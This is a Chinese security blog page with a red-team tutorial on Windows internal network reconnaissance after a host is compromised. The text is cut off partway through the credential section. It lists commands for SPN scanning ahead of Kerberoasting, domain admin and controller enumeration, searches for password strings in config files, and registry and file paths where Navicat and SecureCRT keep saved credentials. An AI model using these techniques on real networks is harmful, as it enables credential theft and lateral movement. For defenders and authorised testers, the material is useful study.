<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>红蓝对抗之Windows内网渗透 - B1gd0g</title>
    <meta charset="UTF-8">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
    <meta name="description" content="红蓝对抗中关于windows内网渗透">
<meta property="og:type" content="article">
<meta property="og:title" content="红蓝对抗之Windows内网渗透">
<meta property="og:url" content="https://b1gd0g.github.io/2021/02/21/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BWindows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
<meta property="og:site_name" content="B1gd0g">
<meta property="og:description" content="红蓝对抗中关于windows内网渗透">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201441081.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201441813.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201442835.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201442738.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201442279.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201443790.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201443866.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201443495.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201439395.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201444544.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201444545.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201445673.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201445155.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234658.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234705.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234709.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234713.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201445038.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201446338.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201446813.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201447142.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201447687.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234839.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234847.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234852.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234856.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234916.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234923.png">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221234926.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e172a5823898eb1018b040d59e29e25d.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/d8a95b481322d26b6404eb104a986489.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/f58ea1fcbb2887c85f5ca0ef19afad78.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/4aa431618abb0a134633c4478ebbd065.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/c94df54ea7f267bdc9ad1e630b2afd01.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/9860d564a3088cc30ea3c7d885ef978a.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/b246443a08bdf28f551a42b10b36da01.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/6d4ee836d657a5b869ec62350ea5db6e.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/0d47d757603d136edc40bcfc86f68d63.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/aba621a5087928fc185117ffb661a9a6.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e1ebc9e7044af895de18b19030551932.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/2ef4ec750e6b8a183f230b97e93e9217.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/aadc3bf934ef7e25df2ad0a70b1a90e3.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/4e26bd19517da1f92d686a39860db6a4.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/eb278ece5c66c23c449f5206838f65a3.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/ec2dc4dbeb8e058b33d4eb14ee51b79c.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/9329f61ca8ec19bdabef3bfa35665b60.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/db678d6e01c9109449b34b1e4d42aacc.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/5594535294c57216b8d2b9b9b198af3c.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/726a2c16b28bff37028c16bff161196a.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/624d3374776021c4da5c723a7593857e.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/d677e03714860a4aca4cbe399a86c27f.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/49017a447e2fbd82e46e7e54c211730f.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/ecc4a0aa0ab6f963120085cf71631c0e.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/744915b82870dd973cea27405cb48c62.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/73a4fc647caa9a32ce693b8f8225311b.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/9ce3b8c4c5f1380ff01e3ebd44f2755e.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/dd647895d59815bb45ba1b699b1babd3.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/a2c8d1115ea079859458e4bab4adf4ea.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/fc24d1ffc70e59ab15c69c7e7c718fa0.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/24a4840a1224c98806e0365e14698bac.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/9fcff97654b793ca18799b4764de70cf.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/429515c5566a1aeb5ea10515e6456227.jpg">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/33fb75f69b6a33780650ccaf98a2a410.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/21b6cbe72b9c460cc5ad82af5e240654.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/59959672dc1cc1b04a1f07dfb35a514f.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/67b341bf9a90ec09dc7c0d09a6ba2cf5.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/369a36df29f70a94666b2c7b41111c9f.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/ac6f8054f05dbb6df518a3468b9d6b8f.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/588248c396495306a5f6ee6d21da1352.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/0bb5e16172b0e32a55a5a35064143785.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/249fe3d260df35609f5f646e6c548f0d.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/46928a316494f9e5bd69f05718bd4b65.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/7005f6a202265f5a168314aaa8d0ed91.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/b6974d7d9d839924944f2b69d8e3ad26.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/d79fc29f02295094d65e0865fece1f07.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/8c39a13c8c01ad3198fcb134b2e367ce.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/7a17651be42552048a322ae3a5d00a88.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e7cb6b0f93ac38e1323c4488ab07eef6.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/f5fb0c6f32eb3f09889b6c117e6188c1.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/d4ef40ce43fd48b8de7ae8ad542cecc7.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/4ace7c90105a501190a0d0d11da54fe0.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/30a9a1bdef10a2d831ac71451c786601.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/bf828b61d0261a01ff7ad61c39e9cbd1.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/7647b5682d1045dfd684a5020a5bf550.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/35fe337e77df084f52d0f3bff0ab1a66.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/bbaab3a7a7c4daa10262819aad5aa130.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/42ecae73402b529a23d6d480f3b121f3.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/991ff8fb17c92e08bcf22be18dadc061.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/8c63d44858acd8c772a45f9ec1743c22.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/95e505462f288f8f2a26bb58c48dc1c9.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/477af68cc3f8ed3e9e879a36829dc8d7.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/3bdf692800ff61c8f069e6f797d6935b.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/2b1777a225ead9cb33d90a824e648d79.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e1856df8c53a91fff831940547629f54.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/205a6890bc6c505441a7f4f9ef78f7e7.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/0734973bcd846034f1240557a0ae0394.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/a3a5981b6e1b6f8b377c69555b024797.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/1ef9f623f64a79890881aa946b897686.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e35df74479df27c2d24801669c2c1769.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/b21c06a5528e9d82144a92e924e4dd01.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/a0a2ee03c16ef5dc12aa5e7acc8ff089.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/f79a0eb65a64c4d5ea1b9f863a34548e.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/3453fa55fdb449e4511ea914a3958811.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/6225c21dfc20dafda2d35cebd1dd2871.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/2f2ccaa982dd3960262521beb7693632.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/44a7ff2fc53be252e027616f19bd234d.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/0f4f5cd62787a7afd6713354c419ebaa.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/18473f684fc59360c42e2b7a117c6af2.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e349c0bc04c85b68888060c81333f12e.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/38b0f3f2e0c9d7775bfc83a9991218d4.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/37dbf3536f367870fcffe2c726ecf242.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/a9cd75e90291bf68fe80d06879680633.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/8d77ff901eb5efa3574bd21258ff5245.png">
<meta property="og:image" content="https://security.tencent.com/uploadimg_dir/blog/154/e12a0c39e90daaea541de9196f514f94.png">
<meta property="article:published_time" content="2021-02-20T17:12:54.000Z">
<meta property="article:modified_time" content="2022-09-30T03:23:41.098Z">
<meta property="article:author" content="B1gd0g">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201441081.png">
    
<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214456">
    
    <link rel="stylesheet" href="/css/style.css?v=1665474214456">

    
<meta name="generator" content="Hexo 5.3.0"></head>

<body class="mdui-drawer-body-left">
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="B1gd0g">
            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>15</div>
        <div><span>标签</span>12</div>
        <div><span>分类</span>2</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                杀软对比
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
            <div class="mdui-list-item-content">
                社工密码
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                我的导航
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>




    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    一言
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.onload = function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  }
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/tools/">tools</a>
          <span class="category-list-count">4</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
          <span class="category-list-count">10</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
    </div>
    
  </div>

    
        
</aside>
    <div class="nexmoe-copyright">
        &copy; 2022 B1gd0g
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
            <img src="https://img-blog.csdnimg.cn/20201023095458372.png" alt="红蓝对抗之Windows内网渗透" loading="lazy">
            <h1>红蓝对抗之Windows内网渗透</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2021年02月21日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/">安全小记</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约10.6k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要43分钟</a>

    </div>
    
    
    
    
    
</div>

    <p>红蓝对抗中关于windows内网渗透</p>
<a id="more"></a>

<h1 id="红蓝对抗之Windows内网渗透"><a href="#红蓝对抗之Windows内网渗透" class="headerlink" title="红蓝对抗之Windows内网渗透"></a>红蓝对抗之Windows内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在攻陷一台机器后，不要一味的直接去抓取机器密码、去做一些扫描内网的操作，因为如果网内有IDS等安全设备，有可能会造成报警，丢失权限。本节主要介绍当一台内网机器被攻破后，我们收集信息的一些手法。</p>
<h2 id="1-1-SPN"><a href="#1-1-SPN" class="headerlink" title="1.1 SPN"></a>1.1 SPN</h2><p>SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。</p>
<p>a、利用Windows自带的setspn工具，普通域用户权限执行即可：</p>
<blockquote>
<p>setspn -T domain.com -Q <em>/</em></p>
</blockquote>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201441081.png" alt="img" data-caption="img" loading="lazy"></p>
<p>在上述截图中可以清晰的看到DCServer机器上运行了dns服务。如果网内存在mssql，利用SPN扫描也可以得到相应的结果。</p>
<p>b、利用GetUserSPNs.vbs也可以获取spn结果:</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201441813.png" alt="img" data-caption="img" loading="lazy"></p>
<p>c、Rubeus工具是Harmj0y开发用于测试Kerberos的利用工具。</p>
<p>如下图利用Rubeus查看哪些域用户注册了SPN，也为后续Kerberoasting做准备：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201442835.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="1-2-端口连接"><a href="#1-2-端口连接" class="headerlink" title="1.2 端口连接"></a>1.2 端口连接</h2><p>利用netstat<br>-ano命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p>
<h2 id="1-3-配置文件"><a href="#1-3-配置文件" class="headerlink" title="1.3 配置文件"></a>1.3 配置文件</h2><p>一个正常的Web应用肯定有对应的数据库账号密码信息，是一个不错的宝藏。</p>
<p>可以使用如下命令寻找包含密码字段的文件：</p>
<blockquote>
<p>cd /web findstr /s /m “password” <em>.</em></p>
</blockquote>
<p>下面是常用应用的默认配置路径：</p>
<p>a、</p>
<blockquote>
<p>Tomcat: CATALINA_HOME/conf/tomcat-users.xml</p>
</blockquote>
<p>b、</p>
<blockquote>
<p>Apache: /etc/httpd/conf/httpd.conf</p>
</blockquote>
<p>c、</p>
<blockquote>
<p>Nginx: /etc/nginx/nginx.conf</p>
</blockquote>
<p>d、</p>
<blockquote>
<p>Wdcp: /www/wdlinux/wdcp/conf/mrpw.conf</p>
</blockquote>
<p>e、</p>
<blockquote>
<p>Mysql: mysql\data\mysql\user.MYD</p>
</blockquote>
<h2 id="1-4-用户信息"><a href="#1-4-用户信息" class="headerlink" title="1.4 用户信息"></a>1.4 用户信息</h2><p>可以在网内收集用户等信息，对高权限用户做针对性的攻击，包括定位到域控，对域控发起攻击。</p>
<p>a、查看域用户，普通域用户权限即可：</p>
<blockquote>
<p>net user /domain</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201442738.png" alt="img" data-caption="img" loading="lazy"></p>
<p>b、查看域管理员：</p>
<blockquote>
<p>net group “domain admins” /domain</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201442279.png" alt="img" data-caption="img" loading="lazy"></p>
<p>c、快速定位域控ip，一般是dns、时间服务器：</p>
<blockquote>
<p>net time /domain</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201443790.png" alt="img" data-caption="img" loading="lazy"></p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201443866.png" alt="img" data-caption="img" loading="lazy"></p>
<blockquote>
<p>nslookup -type=all _ldap._tcp.dc._msdcs.jumbolab.com</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201443495.png"></p>
<p>d、查看域控制器：</p>
<blockquote>
<p>net group “domain controllers” /domain</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201439395.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="1-5-内网主机发现"><a href="#1-5-内网主机发现" class="headerlink" title="1.5 内网主机发现"></a>1.5 内网主机发现</h2><p>可以使用如下命令来达到内网主机的发现。</p>
<p>a、查看共享资料：</p>
<blockquote>
<p>net view</p>
</blockquote>
<p>b、查看arp表：</p>
<blockquote>
<p>arp -a</p>
</blockquote>
<p>c、查看hosts文件：</p>
<blockquote>
<p>linux: cat /etc/hosts</p>
<p>windows: type c:\Windows\system32\drivers\etc\hosts</p>
</blockquote>
<p>d、查看dns缓存：</p>
<blockquote>
<p>ipconfig /displaydns</p>
</blockquote>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201444544.png" alt="img" data-caption="img" loading="lazy"></p>
<p>e、当然，利用一些工具也可以，比如nmap、nbtscan：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201444545.png" alt="img" data-caption="img" loading="lazy"></p>
<h2 id="1-6-会话收集"><a href="#1-6-会话收集" class="headerlink" title="1.6 会话收集"></a>1.6 会话收集</h2><p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p>
<p>可以使用NetSessionEnum api来查看其他主机上有哪些用户登录。</p>
<p>api相关介绍如下：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</a></p>
<p>利用powershell脚本PowerView为例。</p>
<p>a、可以查看域用户登录过哪些机器:</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201445673.png" alt="img" data-caption="img" loading="lazy"></p>
<p>b、也可以查看机器被哪些用户登陆过：</p>
<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201445155.png" alt="img" data-caption="img" loading="lazy"></p>
<p>其他工具、api类似。当有了上述信息后，就可以对发现到的域管或者登录着域管的机器进行攻击，只要能拿下这些机器，就可以有相应的权限去登录域控。</p>
<h2 id="1-7-凭据收集"><a href="#1-7-凭据收集" class="headerlink" title="1.7 凭据收集"></a>1.7 凭据收集</h2><p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码。</p>
<p>比如远程连接凭据:</p>
<p>cmdkey /list</p>
<p>navicat：</p>
<blockquote>
<p>MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\</p>
<p>MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\</p>
<p>MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\</p>
<p>Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\</p>
<p>Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\</p>
<p>PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\</p>
<p>SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\</p>
</blockquote>
<p>SecureCRT：</p>
<p>xp/win2003</p>
<blockquote>
<p>C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</p>
</blockquote>
<p>win7/win2008以上</p>
<blockquote>
<p>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</p>
</blockquote>
<p>Xshell：</p>
